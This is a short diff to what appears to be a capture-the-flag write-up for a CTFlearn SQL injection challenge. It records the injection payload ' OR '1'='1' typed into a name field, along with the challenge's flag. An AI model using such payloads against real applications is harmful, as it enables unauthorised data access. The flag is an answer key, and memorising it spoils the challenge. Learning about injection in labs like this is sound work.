@@ -14,7 +14,7 @@ Your Resulting Query: SELECT * FROM webfour.webfour where name = ''
 
 0 results
 
-Answer: '' OR '1'='1'
+Answer: ' OR '1'='1' | Flag: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
 
 Execution
 Name: Luke
